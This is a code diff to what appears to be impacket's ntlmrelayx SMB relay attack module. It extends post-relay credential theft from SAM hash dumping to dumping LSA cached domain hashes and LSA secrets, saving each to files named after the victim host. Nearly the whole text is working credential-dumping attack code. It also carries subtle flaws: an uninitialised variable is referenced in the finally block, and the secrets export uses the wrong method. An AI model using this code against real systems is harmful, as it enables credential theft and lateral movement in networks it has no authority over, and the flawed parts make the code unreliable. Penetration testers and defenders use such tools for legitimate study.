@@ -128,7 +128,7 @@ class SMBAttack(ProtocolAttack):
                     LOG.error(str(e))
 
             else:
-                from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+                from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
                 from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
                 samHashes = None
                 try:
@@ -168,16 +168,35 @@ class SMBAttack(ProtocolAttack):
                     else:
                         bootKey = remoteOps.getBootKey()
                         remoteOps._RemoteOperations__serviceDeleted = True
-                        samFileName = remoteOps.saveSAM()
-                        samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
-                        samHashes.dump()
-                        samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
-                        LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+
+                        try:
+                            samFileName = remoteOps.saveSAM()
+                            samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
+                            samHashes.dump()
+                            samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
+                            LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                        except Exception as e:
+                            LOG.error('SAM hashes extraction failed: %s' % str(e))
+
+                        try:
+                            lsaFileName = remoteOps.saveSECURITY()
+                            lsaSecrets = LSASecrets(lsaFileName, bootKey, remoteOps, isRemote=True, history=False)
+                            lsaSecrets.dumpCachedHashes()
+                            lsaSecrets.exportCached(self.__SMBConnection.getRemoteHost()+'_lsaCachedHashes')
+                            LOG.info("Done dumping LSA Cached hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                            lsaSecrets.dumpSecrets()
+                            lsaSecrets.exportCached(self.__SMBConnection.getRemoteHost()+'_lsaSecrets')
+                            LOG.info("Done dumping LSA secrets for host: %s", self.__SMBConnection.getRemoteHost())
+                        except Exception as e:
+                            LOG.error('LSA hashes extraction failed: %s' % str(e))
+
                 except Exception as e:
                     LOG.error(str(e))
                 finally:
                     if samHashes is not None:
                         samHashes.finish()
+                    if lsaSecrets is not None:
+                        lsaSecrets.finish()
                     if remoteOps is not None:
                         remoteOps.finish()
                 
